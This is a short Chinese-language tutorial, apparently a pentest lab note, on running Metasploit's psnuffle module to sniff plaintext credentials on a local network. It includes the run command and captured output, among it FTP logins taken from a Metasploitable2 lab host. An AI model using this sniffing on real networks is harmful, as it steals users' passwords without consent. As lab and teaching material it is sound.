# psnuffle

psnuffle和dsniff一样是一个网络嗅探工具，用于监听局域网内大多数协议（FTP, Telnet, SMTP, HTTP, POP, poppass, NNTP, IMAP, SNMP, LDAP, Rlogin, RIP, OSPF, PPTP MS-CHAP, NFS, VRRP, YP/NIS, SOCKS, X11, CVS, IRC, AIM, ICQ, Napster, PostgreSQL, Meeting Maker, Citrix ICA, Symantec pcAnywhere, NAI Sniffer, Microsoft SMB, Oracle SQL*Net, Sybase and Microsoft SQL;），并获取相对应的密码。

使用msf中的psnuffle无需设置相关参数

```shell
msf5 auxiliary(sniffer/psnuffle) > run
[*] Auxiliary module running as background job 0.
msf5 auxiliary(sniffer/psnuffle) > 
[*] Loaded protocol FTP from /usr/share/metasploit-framework/data/exploits/psnuffle/ftp.rb...
[*] Loaded protocol IMAP from /usr/share/metasploit-framework/data/exploits/psnuffle/imap.rb...
[*] Loaded protocol POP3 from /usr/share/metasploit-framework/data/exploits/psnuffle/pop3.rb...
[*] Loaded protocol SMB from /usr/share/metasploit-framework/data/exploits/psnuffle/smb.rb...
[*] Loaded protocol URL from /usr/share/metasploit-framework/data/exploits/psnuffle/url.rb...
[*] Sniffing traffic.....

```

启动模块后，当局域网内的用户使用ftp协议，snuffle会将用户账号和密码打印在后台。本台主机使用IP 192.168.80.200，metaspoiltable2 IP 192.16.80.201，win 192.168.80.129

```
[*] Successful FTP Login: 192.168.80.129:49166-192.168.80.201:21 >> anonymous / User@
[*] HTTP GET: 192.168.80.129:49168-112.13.107.244:80 http://ocsp.dcocsp.cn/MFEwTzBNMEswSTAJBgUrDgMCGgUABBTHv1Dj%2BciPJEWH5JNtwL5Y07mRqwQUxBF%2BiECGwkG%2FZfMa4bRTQKOr7H0CEAfhONK02bo2E4EUVAFIy7I%3D
[*] HTTP GET: 192.168.80.129:49168-112.13.107.244:80 http://ocsp.dcocsp.cn/MFEwTzBNMEswSTAJBgUrDgMCGgUABBTHv1Dj%2BciPJEWH5JNtwL5Y07mRqwQUxBF%2BiECGwkG%2FZfMa4bRTQKOr7H0CEAeIUfSHtbWGwEA2chL%2FIw0%3D
[!] *** auxiliary/sniffer/psnuffle is still calling the deprecated report_auth_info method! This needs to be updated!
[!] *** For detailed information about LoginScanners and the Credentials objects see:
[!]      https://github.com/rapid7/metasploit-framework/wiki/Creating-Metasploit-Framework-LoginScanners
[!]      https://github.com/rapid7/metasploit-framework/wiki/How-to-write-a-HTTP-LoginScanner-Module
[!] *** For examples of modules converted to just report credentials without report_auth_info, see:
[!]      https://github.com/rapid7/metasploit-framework/pull/5376
[!]      https://github.com/rapid7/metasploit-framework/pull/5377
[*] Successful FTP Login: 192.168.80.129:49170-192.168.80.201:21 >> msfadmin / msfadmin
```

> 通过ctrl+c方式退出当前模块，snuffle不会退出
>
> 具体查看jobs
